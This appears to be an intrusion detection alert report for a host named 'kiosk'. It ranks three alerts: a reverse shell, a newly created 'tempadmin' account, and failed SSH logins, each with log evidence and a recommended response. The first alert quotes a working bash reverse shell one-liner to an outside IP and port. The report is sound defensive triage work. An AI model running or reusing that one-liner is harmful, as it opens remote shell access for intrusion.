# Custom IDS Alerts

- Alerts: 3
- High severity: 2
- Medium severity: 1
- Highest severity: `high`

## Priority Queue

1. **high** suspicious-command: Suspicious shell command execution pattern
2. **high** new-user: New local user was created
3. **medium** failed-login: Repeated failed SSH authentication attempt

## Alerts

## suspicious-command

- Severity: high
- Timestamp: May 18 09:02:44
- Description: Suspicious shell command execution pattern
- Evidence: `May 18 09:02:44 kiosk bash[1304]: bash -i >& /dev/tcp/198.51.100.44/4444 0>&1`
- Recommended action: Preserve process context, isolate the host if unauthorized, and review shell history.

## new-user

- Severity: high
- Timestamp: May 18 09:03:10
- Description: New local user was created
- Evidence: `May 18 09:03:10 kiosk useradd[1310]: new user: name=tempadmin, UID=1002, GID=1002, home=/home/tempadmin`
- Recommended action: Confirm the account creation was approved and disable the user if suspicious.

## failed-login

- Severity: medium
- Timestamp: May 18 09:00:01
- Description: Repeated failed SSH authentication attempt
- Evidence: `May 18 09:00:01 kiosk sshd[1201]: Failed password for invalid user admin from 198.51.100.12 port 51222 ssh2`
- Recommended action: Review source IP history, rate-limit SSH, and confirm no successful login followed.
